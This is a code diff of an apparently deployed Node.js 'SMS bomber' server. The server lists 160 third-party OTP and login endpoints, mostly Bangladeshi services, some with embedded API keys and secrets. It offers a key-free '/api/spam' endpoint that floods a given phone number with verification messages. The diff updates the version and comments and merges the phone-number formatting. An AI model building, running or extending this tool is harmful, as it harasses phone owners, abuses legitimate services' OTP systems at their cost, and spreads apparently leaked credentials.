@@ -21,7 +21,7 @@ const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
   website: "https://tnehboomber.onrender.com",
-  api_version: "1.0.0"
+  api_version: "2.0.0"
 };
 
 // ========== PERSISTENT STORAGE ==========
@@ -119,9 +119,9 @@ function cleanExpiredKeys() {
 
 setInterval(cleanExpiredKeys, 60 * 60 * 1000);
 
-// ========== 160 COMPLETE SMS APIs (49 Original + 1 ShadowX + 110 LMNx9) ==========
+// ========== 160 COMPLETE SMS APIs ==========
 const ORIGINAL_APIS = [
-  // GET APIs
+  // GET APIs (1-8)
   {
     id: 1,
     name: "Bikroy.com",
@@ -170,7 +170,7 @@ const ORIGINAL_APIS = [
     method: "GET",
     url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login"
   },
-  // POST APIs
+  // POST APIs (9-49)
   {
     id: 9,
     name: "Deshal.net",
@@ -460,7 +460,7 @@ const ORIGINAL_APIS = [
     url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
     body: {"phone": "{phone}", "applicationChannel": "WEB_APP"}
   },
-  // ShadowX API
+  // ShadowX API (50)
   {
     id: 50,
     name: "ShadowX API",
@@ -472,7 +472,7 @@ const ORIGINAL_APIS = [
   }
 ];
 
-// Generate LMNx9 APIs (API 51 to 160)
+// Generate LMNx9 APIs (51-160)
 const LMNX9_APIS = [];
 for (let i = 1; i <= 110; i++) {
   LMNX9_APIS.push({
@@ -509,16 +509,8 @@ async function sendSMS(api, phone, count = 1) {
   try {
     const cleanPhone = phone.replace(/[^0-9]/g, '');
     
-    // For ShadowX API, use 11-digit format (without +880)
     let formattedPhone = cleanPhone;
-    if (api.isShadowX) {
-      if (formattedPhone.startsWith('880')) {
-        formattedPhone = formattedPhone.substring(3);
-      }
-    }
-    
-    // For LMNx9 APIs, they expect 11-digit format without +880
-    if (api.isLMNx9) {
+    if (api.isShadowX || api.isLMNx9) {
       if (formattedPhone.startsWith('880')) {
         formattedPhone = formattedPhone.substring(3);
       }
@@ -594,7 +586,7 @@ app.get('/', async (req, res) => {
     endpoints: {
       generate_key: "/api/expiredate=30&createkey",
       check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomber: "/api/spam?number=017XXXXXXXX&count=160",  // NO KEY REQUIRED
+      spam_bomber: "/api/spam?number=017XXXXXXXX&count=160",
       single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api_id=1",
       all_apis: "/api/apis",
       health: "/api/health"
@@ -602,9 +594,7 @@ app.get('/', async (req, res) => {
   });
 });
 
-// ================================================
 // SMS SPAM ENDPOINT - NO API KEY REQUIRED
-// ================================================
 app.get('/api/spam', async (req, res) => {
   const { number, count = 10 } = req.query;
   
@@ -617,7 +607,6 @@ app.get('/api/spam', async (req, res) => {
     });
   }
   
-  // Validate number (Bangladeshi format)
   const cleanNumber = number.replace(/[^0-9]/g, '');
   const phoneRegex = /^(01|8801)[0-9]{9}$/;
   if (!phoneRegex.test(cleanNumber)) {
@@ -665,11 +654,7 @@ app.get('/api/spam', async (req, res) => {
   });
 });
 
-// ================================================
-// KEY-REQUIRED ENDPOINTS
-// ================================================
-
-// Generate API Key (30 days)
+// Generate API Key
 app.get('/api/expiredate=30&createkey', (req, res) => {
   const apiKey = generateApiKey();
   const expiryDate = new Date();
@@ -898,7 +883,6 @@ app.get('/api/health', (req, res) => {
     valid_keys: validCount,
     keys_file_location: KEYS_FILE,
     is_render: !!process.env.RENDER,
-    api_range: "API 1 to API 160",
     api_breakdown: {
       original_apis: 49,
       shadowx_api: 1,
@@ -909,7 +893,7 @@ app.get('/api/health', (req, res) => {
       root: "/",
       generate_key: "/api/expiredate=30&createkey",
       check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomber: "/api/spam?number=017XXXXXXXX&count=160",  // NO KEY REQUIRED
+      spam_bomber: "/api/spam?number=017XXXXXXXX&count=160",
       single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api_id=1",
       specific_api: "/api/api/1?key=YOUR_KEY&number=017XXXXXXXX",
       all_apis: "/api/apis",
@@ -952,7 +936,9 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`🖥️ Running on Render: ${!!process.env.RENDER}`);
   console.log(`\n🔓 FREE API ENDPOINT (No Key Required):`);
   console.log(`   GET /api/spam?number=017XXXXXXXX&count=160\n`);
-  console.log(`🆕 NEW APIs ADDED:`);
-  console.log(`   LMNx9 API1 to API110 - All integrated`);
-  console.log(`   Total 110 new SMS APIs now available!\n`);
+  console.log(`📌 Quick Start:`);
+  console.log(`   Generate Key: /api/expiredate=30&createkey`);
+  console.log(`   Check Key: /api/checkkey?key=YOUR_KEY`);
+  console.log(`   View APIs: /api/apis`);
+  console.log(`   Health Check: /api/health\n`);
 });
